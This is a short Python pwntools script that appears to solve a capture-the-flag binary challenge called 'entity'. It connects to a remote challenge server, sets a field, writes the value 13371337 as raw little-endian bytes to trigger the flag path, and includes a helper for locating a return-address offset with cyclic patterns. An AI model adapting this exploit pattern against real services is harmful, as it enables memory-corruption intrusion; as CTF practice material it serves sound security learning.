#!/usr/bin/env python3

from pwn import *

exe = ELF("entity_patched")

context.binary = exe

context.terminal = ['tmux', 'splitw', '-h', '-p', '70', '-I']
# context.log_level 	= "WARNING"
context.log_level 	= "DEBUG"
isDebug = False
shouldPrint = True

gs = '''
break get_flag
continue
'''.format(**locals())

def start_local(isDebug, argv=[], *a, **kw):
	if args.GDB or isDebug:
		return gdb.debug([exe.path], gdbscript=gs)
	else:
		return process([exe.path], *a, **kw)
		
def find_ip_offset(payload):
	io = process(elf.path)
	io.sendlineafter(b": ", payload)
	
	io.wait()
	
	#ip_offset = cyclic_find(io.corefile.pc) # x86
	ip_offset = cyclic_find(io.corefile.read(io.corefile.sp, 4))
	info("Located RIP offset at [%s]", ip_offset)
	return ip_offset

def print_result(result):
	if shouldPrint:
		print(result)
  
def set_field():
    io.sendlineafter(b">> ", b"T")	
    
def get_flag():
    io.sendlineafter(b">> ", b"C")	
    
def set_string(value:bytes):
	io.sendlineafter(b">> ", b"S")
	io.sendlineafter(b">> ", value)
 
		
#===========================================================
#                    EXPLOIT GOES HERE					   #
#===========================================================

######## LOCAL ########
# ip_offset = find_ip_offset(cyclic(200))
# ip_offset = 56
# io = start_local(isDebug)

######## REMOTE ########
remote_address = "94.237.49.128:56915"
io = remote(remote_address.split(":")[0], int(remote_address.split(":")[1]))
io.timeout = 0.5

set_field()
set_string(b"\xC9\x07\xCC\x00\x00\x00\x00\x00")  # 13371337 in little-endian 8-byte format
get_flag()

io.interactive()
